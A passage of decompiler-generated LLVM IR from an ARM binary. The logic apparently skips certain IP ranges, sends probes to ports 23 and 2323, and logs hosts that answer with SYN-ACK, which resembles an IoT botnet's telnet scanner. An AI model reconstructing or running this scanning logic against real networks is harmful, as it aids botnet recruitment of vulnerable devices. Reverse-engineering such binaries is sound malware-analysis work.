  %v8_ef50 = icmp eq i32 %v1_ede8, 21
  store i1 %v8_ef50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef50, label %dec_label_pc_ede4, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %bb396
  %v2_ef58 = icmp ugt i32 %v1_ede8, 27
  store i1 %v2_ef58, i1* %cpsr_c.global-to-local, align 1
  %v7_ef58 = icmp eq i32 %v1_ede8, 28
  store i1 %v7_ef58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef58, label %dec_label_pc_ede4, label %bb397

bb397:                                            ; preds = %dec_label_pc_ef58
  %v3_ef5c = icmp ugt i32 %v1_ede8, 25
  store i1 %v3_ef5c, i1* %cpsr_c.global-to-local, align 1
  %v8_ef5c = icmp eq i32 %v1_ede8, 26
  store i1 %v8_ef5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef5c, label %dec_label_pc_ede4, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %bb397
  %v2_ef64 = icmp ugt i32 %v1_ede8, 29
  store i1 %v2_ef64, i1* %cpsr_c.global-to-local, align 1
  %v7_ef64 = icmp eq i32 %v1_ede8, 30
  store i1 %v7_ef64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef64, label %dec_label_pc_ede4, label %bb398

bb398:                                            ; preds = %dec_label_pc_ef64
  %v3_ef68 = icmp ugt i32 %v1_ede8, 28
  store i1 %v3_ef68, i1* %cpsr_c.global-to-local, align 1
  %v8_ef68 = icmp eq i32 %v1_ede8, 29
  store i1 %v8_ef68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef68, label %dec_label_pc_ede4, label %dec_label_pc_ef70

dec_label_pc_ef70:                                ; preds = %bb398
  %v2_ef70 = icmp ugt i32 %v1_ede8, 54
  store i1 %v2_ef70, i1* %cpsr_c.global-to-local, align 1
  %v7_ef70 = icmp eq i32 %v1_ede8, 55
  store i1 %v7_ef70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef70, label %dec_label_pc_ede4, label %bb399

bb399:                                            ; preds = %dec_label_pc_ef70
  %v3_ef74 = icmp ugt i32 %v1_ede8, 32
  store i1 %v3_ef74, i1* %cpsr_c.global-to-local, align 1
  %v8_ef74 = icmp eq i32 %v1_ede8, 33
  store i1 %v8_ef74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef74, label %dec_label_pc_ede4, label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %bb399
  %v2_ef7c = icmp ugt i32 %v1_ede8, 214
  store i1 %v2_ef7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef7c = icmp eq i32 %v1_ede8, 215
  store i1 %v7_ef7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef7c, label %.thread47, label %bb400

bb400:                                            ; preds = %dec_label_pc_ef7c
  %v3_ef80 = icmp ugt i32 %v1_ede8, 213
  store i1 %v3_ef80, i1* %cpsr_c.global-to-local, align 1
  %v8_ef80 = icmp eq i32 %v1_ede8, 214
  store i1 %v8_ef80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef80, label %bb401, label %dec_label_pc_ef90

.thread47:                                        ; preds = %dec_label_pc_ef7c
  br label %dec_label_pc_ede4

bb401:                                            ; preds = %bb400
  br label %dec_label_pc_ede4

dec_label_pc_ef90:                                ; preds = %bb400
  %v5_ef9c = call i32 @llvm.bswap.i32(i32 %v0_ede4)
  store i32 %v5_ef9c, i32* %r3.global-to-local, align 4
  %tmp402 = and i32 %v0_ede4, 65280
  %tmp403 = call i32 @llvm.bswap.i32(i32 %tmp402)
  %v3_efa4 = udiv i32 %v5_ef9c, 16777216
  %tmp404 = and i32 %v0_ede4, 16711680
  %tmp405 = call i32 @llvm.bswap.i32(i32 %tmp404)
  %v4_efac = udiv i32 %tmp403, 256
  %v4_efb0 = mul nuw nsw i32 %tmp405, 256
  store i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32* @r0, align 4
  %tmp406 = and i32 %v0_ede4, 65536
  %v3_efb8 = icmp ne i32 %tmp406, 0
  store i1 %v3_efb8, i1* %cpsr_c.global-to-local, align 1
  %v4_efb8 = mul i32 %v5_ef9c, 16777216
  %v5_efac = or i32 %v4_efb8, %v3_efa4
  %v5_efb0 = or i32 %v5_efac, %v4_efac
  %v5_efb8 = or i32 %v5_efb0, %v4_efb0
  store i32 %v5_efb8, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_1f27e.180 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_efb8, i32* @global_var_1f284.181, align 4
  %v3_efc8 = call i32 @function_c848(i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32 20)
  %v4_efc8 = trunc i32 %v3_efc8 to i16
  store i32 %v3_efc8, i32* %r0.global-to-local, align 4
  %v3_efcc = load i32, i32* %stack_var_-52, align 4
  %v5_efdc = sdiv i32 %v3_efcc, 10
  %v3_efe0 = mul i32 %v5_efdc, 8
  store i32 %v3_efe0, i32* %r2.global-to-local, align 4
  %v2_efe8 = mul i32 %v5_efdc, 10
  store i32 %v2_efe8, i32* %r3.global-to-local, align 4
  %v3_efec = icmp uge i32 %v3_efcc, %v2_efe8
  store i1 %v3_efec, i1* %cpsr_c.global-to-local, align 1
  %v9_efec = icmp eq i32 %v3_efcc, %v2_efe8
  store i1 %v9_efec, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_efec, label %bb407, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_ef90
  store i32 ptrtoint (i16* @global_var_1f288.141 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_efc8, i16* bitcast (i32* @global_var_1f27e.180 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1f288.141 to i32), i32 2) to i16*), align 2
  %v4_f00c = load i32, i32* @global_var_1f284.181, align 4
  store i32 %v4_f00c, i32* @global_var_1f28c.183, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb408

bb407:                                            ; preds = %dec_label_pc_ef90
  store i16 %v4_efc8, i16* bitcast (i32* @global_var_1f27e.180 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32* %r0.global-to-local, align 4
  %v4_f00c53 = load i32, i32* @global_var_1f284.181, align 4
  store i32 ptrtoint (i16* @global_var_1f288.141 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_f00c53, i32* @global_var_1f28c.183, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1f288.141 to i32), i32 2) to i16*), align 2
  br label %bb408

bb408:                                            ; preds = %.thread59, %bb407
  store i16 0, i16* bitcast (i32* @global_var_1f298.184 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_1f288.141 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_f038 = call i32 @function_c898(i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32 sext (i16 ptrtoint (i16* @global_var_1f288.141 to i16) to i32), i32 5120, i32 20)
  %v7_f038 = trunc i32 %v6_f038 to i16
  store i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32* %r1.global-to-local, align 4
  %v2_f044 = load i32, i32* @global_var_212f8.136, align 4
  store i16 %v7_f038, i16* bitcast (i32* @global_var_1f298.184 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 %v2_f634, i32* %ip.global-to-local, align 4
  store i32 %v2_f044, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_f08c = call i32 @function_11a68(i32 %v2_f044, i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32 40, i32 16384, i32 %v2_10130, i32 16)
  store i32 %v7_f08c, i32* %r0.global-to-local, align 4
  %v3_f090 = load i32, i32* %stack_var_-52, align 4
  %v1_f094 = add i32 %v3_f090, 1
  store i32 %v1_f094, i32* %r3.global-to-local, align 4
  %v3_f098 = icmp ugt i32 %v1_f094, 383
  store i1 %v3_f098, i1* %cpsr_c.global-to-local, align 1
  %v8_f098 = icmp eq i32 %v1_f094, 384
  store i1 %v8_f098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f094, i32* %stack_var_-52, align 4
  %v5_f0a0 = icmp slt i32 %v1_f094, 384
  br i1 %v5_f0a0, label %dec_label_pc_edb8, label %dec_label_pc_f0a4

dec_label_pc_f0a4:                                ; preds = %bb408
  %v0_f0a4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_ed94, %dec_label_pc_f0a4
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_ed94 ], [ %v0_f0a4, %dec_label_pc_f0a4 ]
  %v0_f0a8 = call i32 @function_11734()
  store i32 %v2_ed8c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_f0b8, i32* @r4, align 4
  %v2_f0c4 = inttoptr i32 %v0_f0a8 to i32*
  br label %dec_label_pc_f0bc

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_f180, %dec_label_pc_f178, %dec_label_pc_f170, %dec_label_pc_f14c, %dec_label_pc_f13c, %dec_label_pc_f124, %dec_label_pc_f10c, %dec_label_pc_f168, %dec_label_pc_f15c, %dec_label_pc_f104, %dec_label_pc_f238, %dec_label_pc_f0a8
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_f0c4, align 4
  %v2_f0cc = load i32, i32* @global_var_212f8.136, align 4
  store i32 %v2_f0cc, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_ed8c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f0e0 = load i32, i32* %ip.global-to-local, align 4
  %v6_f0e8 = call i32 @function_119f4(i32 %v2_f0cc, i32 %v2_ed8c, i32 1514, i32 16384, i32 %v0_f0e0, i32 %v0_f0e0)
  store i32 %v6_f0e8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0ec = icmp eq i32 %v6_f0e8, 0
  store i1 %v2_f0ec, i1* %cpsr_z.global-to-local, align 1
  %tmp409 = icmp slt i32 %v6_f0e8, 1
  br i1 %tmp409, label %dec_label_pc_f248, label %dec_label_pc_f0f4

dec_label_pc_f0f4:                                ; preds = %dec_label_pc_f0bc
  store i32 %v0_f0a8, i32* %ip.global-to-local, align 4
  %v2_f0f8 = load i32, i32* %v2_f0c4, align 4
  store i32 %v2_f0f8, i32* %r3.global-to-local, align 4
  %v2_f0fc = icmp ugt i32 %v2_f0f8, 10
  store i1 %v2_f0fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f0fc = icmp eq i32 %v2_f0f8, 11
  store i1 %v7_f0fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0fc, label %dec_label_pc_f248, label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %dec_label_pc_f0f4
  %v2_f104 = icmp ugt i32 %v6_f0e8, 38
  store i1 %v2_f104, i1* %cpsr_c.global-to-local, align 1
  %v7_f104 = icmp eq i32 %v6_f0e8, 39
  store i1 %v7_f104, i1* %cpsr_z.global-to-local, align 1
  %v2_f108 = xor i1 %v2_f104, true
  %v3_f108 = or i1 %v7_f104, %v2_f108
  br i1 %v3_f108, label %dec_label_pc_f0bc, label %dec_label_pc_f10c

dec_label_pc_f10c:                                ; preds = %dec_label_pc_f104
  store i32 ptrtoint (i32* @global_var_212d8.45 to i32), i32* %r0.global-to-local, align 4
  %v3_f114 = load i32, i32* %v2_f114, align 4
  store i32 %v3_f114, i32* %r2.global-to-local, align 4
  %v2_f118 = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_f118, i32* %r3.global-to-local, align 4
  %v3_f11c = icmp uge i32 %v3_f114, %v2_f118
  store i1 %v3_f11c, i1* %cpsr_c.global-to-local, align 1
  %v9_f11c = icmp eq i32 %v3_f114, %v2_f118
  store i1 %v9_f11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f11c, label %dec_label_pc_f124, label %dec_label_pc_f0bc

dec_label_pc_f124:                                ; preds = %dec_label_pc_f10c
  %v3_f124 = load i8, i8* %v2_f124, align 1
  %v4_f124 = zext i8 %v3_f124 to i32
  store i32 %v4_f124, i32* %r3.global-to-local, align 4
  %v2_f128 = icmp ugt i8 %v3_f124, 5
  store i1 %v2_f128, i1* %cpsr_c.global-to-local, align 1
  %v7_f128 = icmp eq i8 %v3_f124, 6
  store i1 %v7_f128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f128, label %dec_label_pc_f130, label %dec_label_pc_f0bc

dec_label_pc_f130:                                ; preds = %dec_label_pc_f124
  %v0_f130 = load i32, i32* @r4, align 4
  %v1_f130 = inttoptr i32 %v0_f130 to i16*
  %v2_f130 = load i16, i16* %v1_f130, align 2
  %v3_f130 = zext i16 %v2_f130 to i32
  store i32 %v3_f130, i32* %ip.global-to-local, align 4
  %v2_f134 = icmp ugt i16 %v2_f130, 5887
  store i1 %v2_f134, i1* %cpsr_c.global-to-local, align 1
  %v7_f134 = icmp eq i16 %v2_f130, 5888
  store i1 %v7_f134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f134, label %dec_label_pc_f14c, label %dec_label_pc_f13c

dec_label_pc_f13c:                                ; preds = %dec_label_pc_f130
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_f144 = icmp ugt i16 %v2_f130, 4872
  store i1 %v3_f144, i1* %cpsr_c.global-to-local, align 1
  %v9_f144 = icmp eq i16 %v2_f130, 4873
  store i1 %v9_f144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f144, label %dec_label_pc_f14c, label %dec_label_pc_f0bc

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f13c, %dec_label_pc_f130
  %v1_f14c = add i32 %v0_f130, 2
  %v2_f14c = inttoptr i32 %v1_f14c to i16*
  %v3_f14c = load i16, i16* %v2_f14c, align 2
  %v4_f14c = zext i16 %v3_f14c to i32
  store i32 %v4_f14c, i32* %r3.global-to-local, align 4
  store i32 %v4_ec5c, i32* %r1.global-to-local, align 4
  %v3_f154 = icmp uge i32 %v4_f14c, %v4_ec5c
  store i1 %v3_f154, i1* %cpsr_c.global-to-local, align 1
  %v9_f154 = icmp eq i32 %v4_f14c, %v4_ec5c
  store i1 %v9_f154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f154, label %dec_label_pc_f15c, label %dec_label_pc_f0bc

dec_label_pc_f15c:                                ; preds = %dec_label_pc_f14c
  %v1_f15c = add i32 %v0_f130, 13
  %v2_f15c = inttoptr i32 %v1_f15c to i8*
  %v3_f15c = load i8, i8* %v2_f15c, align 1
  %v4_f15c = zext i8 %v3_f15c to i32
  store i32 %v4_f15c, i32* %r3.global-to-local, align 4
  %v1_f160 = and i32 %v4_f15c, 2
  %v2_f160 = icmp eq i32 %v1_f160, 0
  store i1 %v2_f160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f160, label %dec_label_pc_f0bc, label %dec_label_pc_f168

dec_label_pc_f168:                                ; preds = %dec_label_pc_f15c
  %v1_f168 = and i32 %v4_f15c, 16
  %v2_f168 = icmp eq i32 %v1_f168, 0
  store i1 %v2_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f168, label %dec_label_pc_f0bc, label %dec_label_pc_f170

dec_label_pc_f170:                                ; preds = %dec_label_pc_f168
  %v1_f170 = and i32 %v4_f15c, 4
  %v2_f170 = icmp eq i32 %v1_f170, 0
  store i1 %v2_f170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f170, label %dec_label_pc_f178, label %dec_label_pc_f0bc

dec_label_pc_f178:                                ; preds = %dec_label_pc_f170
  %tmp = urem i8 %v3_f15c, 2
  %v2_f178 = icmp eq i8 %tmp, 0
  store i1 %v2_f178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f178, label %dec_label_pc_f180, label %dec_label_pc_f0bc

dec_label_pc_f180:                                ; preds = %dec_label_pc_f178
  %v1_f180 = add i32 %v0_f130, 8
  %v2_f180 = inttoptr i32 %v1_f180 to i32*
  %v3_f180 = load i32, i32* %v2_f180, align 4
  %v5_f198 = call i32 @llvm.bswap.i32(i32 %v3_f180)
  %v1_f19c = add i32 %v5_f198, -1
  store i32 %v1_f19c, i32* %r2.global-to-local, align 4
  %v3_f1a4 = udiv i32 %v1_f19c, 16777216
  %v1_f1a0 = udiv i32 %v1_f19c, 256
  %v4_f1a8 = and i32 %v1_f1a0, 65280
  %v5_f1a8 = or i32 %v4_f1a8, %v3_f1a4
  store i32 %v2_ed8c, i32* %r0.global-to-local, align 4
  %v1_f1b0 = and i32 %v1_f19c, 65280
  store i32 %v1_f1b0, i32* %r1.global-to-local, align 4
  %v4_f1b4 = mul nuw nsw i32 %v1_f1b0, 256
  %v5_f1b4 = or i32 %v5_f1a8, %v4_f1b4
  store i32 %v5_f1b4, i32* %r3.global-to-local, align 4
  %v3_f1b8 = load i32, i32* %v2_f1b8, align 4
  store i32 %v3_f1b8, i32* @lr, align 4
  %v5_f1bc = call i32 @llvm.bswap.i32(i32 %v1_f19c)
  store i32 %v5_f1bc, i32* %r3.global-to-local, align 4
  %v3_f1c0 = icmp uge i32 %v5_f1bc, %v3_f1b8
  store i1 %v3_f1c0, i1* %cpsr_c.global-to-local, align 1
  %v9_f1c0 = icmp eq i32 %v5_f1bc, %v3_f1b8
  store i1 %v9_f1c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f1c0, label %dec_label_pc_f1c8, label %dec_label_pc_f0bc

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f180
  %v0_f1c8 = load i32, i32* @r5, align 4
  %v2_f1c8 = icmp ugt i32 %v0_f1c8, 254
  store i1 %v2_f1c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1c8 = icmp eq i32 %v0_f1c8, 255
  store i1 %v7_f1c8, i1* %cpsr_z.global-to-local, align 1
  %v8_f1cc = icmp sgt i32 %v0_f1c8, 255
  br i1 %v8_f1cc, label %dec_label_pc_f248, label %dec_label_pc_f1d0

dec_label_pc_f1d0:                                ; preds = %dec_label_pc_f1c8
  %v2_f1d8 = load i32, i32* @global_var_212f4.134, align 4
  store i32 %v2_f1d8, i32* %r1.global-to-local, align 4
  %v3_f1dc = mul i32 %v0_f1c8, 256
  store i32 %v3_f1dc, i32* %r2.global-to-local, align 4
  %v2_f1e0 = mul i32 %v0_f1c8, 288
  store i32 %v2_f1e0, i32* %r3.global-to-local, align 4
  %v2_f1e4 = add i32 %v2_f1d8, %v2_f1e0
  store i32 %v2_f1e4, i32* @r0, align 4
  %v1_f1e8 = add i32 %v2_f1e4, 12
  %v2_f1e8 = inttoptr i32 %v1_f1e8 to i32*
  %v3_f1e8 = load i32, i32* %v2_f1e8, align 4
  store i32 %v3_f1e8, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1ec = icmp eq i32 %v3_f1e8, 0
  store i1 %v2_f1ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1ec, label %dec_label_pc_f230, label %dec_label_pc_f20c.preheader

dec_label_pc_f20c.preheader:                      ; preds = %dec_label_pc_f1d0
  %v2_f1f0 = add i32 %v0_f1c8, 1
  %v2_f1f8 = and i32 %v2_f1f0, 134217728
  %v3_f1f8 = icmp ne i32 %v2_f1f8, 0
  store i1 %v3_f1f8, i1* %cpsr_c.global-to-local, align 1
  %v3_f1fc = mul i32 %v2_f1f0, 288
  %v3_f200 = add i32 %v2_f1d8, %v3_f1fc
  store i32 %v3_f200, i32* %r3.global-to-local, align 4
  store i32 %v0_f1c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f20c

dec_label_pc_f20c:                                ; preds = %dec_label_pc_f20c.preheader, %dec_label_pc_f218
  %v0_f218 = phi i32 [ %v3_f200, %dec_label_pc_f20c.preheader ], [ %v1_f224, %dec_label_pc_f218 ]
  %v0_f20c = phi i32 [ %v0_f1c8, %dec_label_pc_f20c.preheader ], [ %v1_f20c, %dec_label_pc_f218 ]
  %v1_f20c = add i32 %v0_f20c, 1
  store i32 %v1_f20c, i32* %r2.global-to-local, align 4
  %v7_f210 = icmp eq i32 %v1_f20c, 256
  br i1 %v7_f210, label %dec_label_pc_f248.loopexit, label %dec_label_pc_f218

dec_label_pc_f218:                                ; preds = %dec_label_pc_f20c
  store i32 %v0_f218, i32* @r0, align 4
  %v1_f21c = add i32 %v0_f218, 12
  %v2_f21c = inttoptr i32 %v1_f21c to i32*
  %v3_f21c = load i32, i32* %v2_f21c, align 4
  %v2_f220 = icmp eq i32 %v3_f21c, 0
  %v1_f224 = add i32 %v0_f218, 288
  store i32 %v1_f224, i32* %r3.global-to-local, align 4
  br i1 %v2_f220, label %dec_label_pc_f22c, label %dec_label_pc_f20c

dec_label_pc_f22c:                                ; preds = %dec_label_pc_f218
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f20c, i32* @r5, align 4
  br label %dec_label_pc_f230

dec_label_pc_f230:                                ; preds = %dec_label_pc_f1d0, %dec_label_pc_f22c
  %v1_f238 = phi i32 [ %v2_f1e4, %dec_label_pc_f1d0 ], [ %v0_f218, %dec_label_pc_f22c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f230 = icmp eq i32 %v1_f238, 0
  store i1 %v2_f230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f230, label %dec_label_pc_f248, label %dec_label_pc_f238

dec_label_pc_f238:                                ; preds = %dec_label_pc_f230
  %v2_f238 = add i32 %v1_f238, 16
  %v3_f238 = inttoptr i32 %v2_f238 to i32*
  store i32 %v3_f1b8, i32* %v3_f238, align 4
  %v0_f23c = load i32, i32* %ip.global-to-local, align 4
  %v1_f23c = trunc i32 %v0_f23c to i16
  %v2_f23c = load i32, i32* @r0, align 4
  %v3_f23c = add i32 %v2_f23c, 20
  %v4_f23c = inttoptr i32 %v3_f23c to i16*
  store i16 %v1_f23c, i16* %v4_f23c, align 2
  %v0_f240 = call i32 @function_e868()
  store i32 %v0_f240, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f0bc

dec_label_pc_f248.loopexit:                       ; preds = %dec_label_pc_f20c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f248

dec_label_pc_f248:                                ; preds = %dec_label_pc_f230, %dec_label_pc_f1c8, %dec_label_pc_f0f4, %dec_label_pc_f0bc, %dec_label_pc_f248.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_f268515 = load i32, i32* @sp, align 4
  %v3_f268516 = add i32 %v2_f268515, 1676
  %v4_f268517 = inttoptr i32 %v3_f268516 to i32*
  store i32 0, i32* %v4_f268517, align 4
  br label %dec_label_pc_f254.dec_label_pc_f254_crit_edge

dec_label_pc_f254.dec_label_pc_f254_crit_edge:    ; preds = %dec_label_pc_f248, %dec_label_pc_f254.dec_label_pc_f254_crit_edge
  %v0_f254.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f258 = add i32 %v0_f254.pre, 4
  store i32 %v1_f258, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f260 = add i32 %v0_f254.pre, 1672
  store i32 %v1_f260, i32* %ip.global-to-local, align 4
  %v7_f264 = icmp eq i32 %v1_f258, 128
  %v2_f268 = load i32, i32* @sp, align 4
  %v3_f268 = add i32 %v2_f268, %v1_f260
  %v4_f268 = inttoptr i32 %v3_f268 to i32*
  store i32 0, i32* %v4_f268, align 4
  br i1 %v7_f264, label %dec_label_pc_f270, label %dec_label_pc_f254.dec_label_pc_f254_crit_edge

dec_label_pc_f270:                                ; preds = %dec_label_pc_f254.dec_label_pc_f254_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f270 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f270, i32* %stack_var_-352, align 4
  %v1_f27c518 = add i32 %v0_f270, 8
  store i32 %v1_f27c518, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f284519 = add i32 %v0_f270, 1548
  store i32 %v1_f284519, i32* @lr, align 4
  %v7_f288520 = icmp eq i32 %v1_f27c518, 128
  %v2_f28c521 = load i32, i32* @sp, align 4
  %v3_f28c522 = add i32 %v2_f28c521, %v1_f284519
  %v4_f28c523 = inttoptr i32 %v3_f28c522 to i32*
  store i32 0, i32* %v4_f28c523, align 4
  br i1 %v7_f288520, label %dec_label_pc_f294, label %dec_label_pc_f278.dec_label_pc_f278_crit_edge

dec_label_pc_f278.dec_label_pc_f278_crit_edge:    ; preds = %dec_label_pc_f270, %dec_label_pc_f278.dec_label_pc_f278_crit_edge
  %v0_f278.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_f27c = add i32 %v0_f278.pre, 4
  store i32 %v1_f27c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f284 = add i32 %v0_f278.pre, 1544
  store i32 %v1_f284, i32* @lr, align 4
  %v7_f288 = icmp eq i32 %v1_f27c, 128
  %v2_f28c = load i32, i32* @sp, align 4
  %v3_f28c = add i32 %v2_f28c, %v1_f284
  %v4_f28c = inttoptr i32 %v3_f28c to i32*
  store i32 0, i32* %v4_f28c, align 4
  br i1 %v7_f288, label %dec_label_pc_f294, label %dec_label_pc_f278.dec_label_pc_f278_crit_edge

dec_label_pc_f294:                                ; preds = %dec_label_pc_f278.dec_label_pc_f278_crit_edge, %dec_label_pc_f270
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f294 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f294, i32* @r6, align 4
  store i32 %v0_f294, i32* @r5, align 4
  store i32 %v0_f294, i32* %stack_var_-52, align 4
  br label %dec_label_pc_f2f0

dec_label_pc_f2a4:                                ; preds = %dec_label_pc_f320
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f30c, i1* %cpsr_z.global-to-local, align 1
  %v1_f390 = add i32 %v2_f304, 4
  %v2_f390 = inttoptr i32 %v1_f390 to i32*
  %v3_f390 = load i32, i32* %v2_f390, align 4
  br i1 %v7_f30c, label %dec_label_pc_f390, label %dec_label_pc_f2ac

dec_label_pc_f2ac:                                ; preds = %dec_label_pc_f2a4
  store i32 %v3_f390, i32* %ip.global-to-local, align 4
  %v3_f2b0 = udiv i32 %v3_f390, 32
  store i32 %v2_f39c, i32* %r0.global-to-local, align 4
  %v3_f2b8 = mul nuw nsw i32 %v3_f2b0, 4
  %v2_f2bc = add i32 %v3_f2b8, %v2_f39c
  store i32 %v2_f2bc, i32* %r3.global-to-local, align 4
  %v1_f2c0 = add i32 %v2_f2bc, -184
  %v2_f2c0 = inttoptr i32 %v1_f2c0 to i32*
  %v3_f2c0 = load i32, i32* %v2_f2c0, align 4
  %v1_f2c4 = urem i32 %v3_f390, 32
  store i32 %v1_f2c4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_f2cc = shl i32 1, %v1_f2c4
  %v8_f2cc = or i32 %v3_f2c0, %v7_f2cc
  store i32 %v8_f2cc, i32* %r2.global-to-local, align 4
  store i32 %v8_f2cc, i32* %v2_f2c0, align 4
  %v0_f2d4 = load i32, i32* @r6, align 4
  %v1_f2d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_f2d4 = icmp uge i32 %v0_f2d4, %v1_f2d4
  store i1 %v3_f2d4, i1* %cpsr_c.global-to-local, align 1
  %v9_f2d4 = icmp eq i32 %v0_f2d4, %v1_f2d4
  store i1 %v9_f2d4, i1* %cpsr_z.global-to-local, align 1
  %v5_f2d8 = icmp slt i32 %v0_f2d4, %v1_f2d4
  br i1 %v5_f2d8, label %bb410, label %bb411

bb410:                                            ; preds = %dec_label_pc_f2ac
  store i32 %v1_f2d4, i32* @r6, align 4
  br label %bb411

bb411:                                            ; preds = %.thread74, %bb417, %bb415, %bb419, %dec_label_pc_f384, %dec_label_pc_f2ac, %bb410
  %v3_f2dc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f2dc, i32* %r3.global-to-local, align 4
  %v1_f2e0 = add i32 %v3_f2dc, 1
  store i32 %v1_f2e0, i32* %r2.global-to-local, align 4
  %v2_f2e4 = icmp ugt i32 %v1_f2e0, 254
  store i1 %v2_f2e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f2e4 = icmp eq i32 %v1_f2e0, 255
  store i1 %v7_f2e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f2e0, i32* %stack_var_-52, align 4
  %v8_f2ec = icmp sgt i32 %v1_f2e0, 255
  br i1 %v8_f2ec, label %dec_label_pc_f3c0, label %dec_label_pc_f2f0

dec_label_pc_f2f0:                                ; preds = %bb411, %dec_label_pc_f294
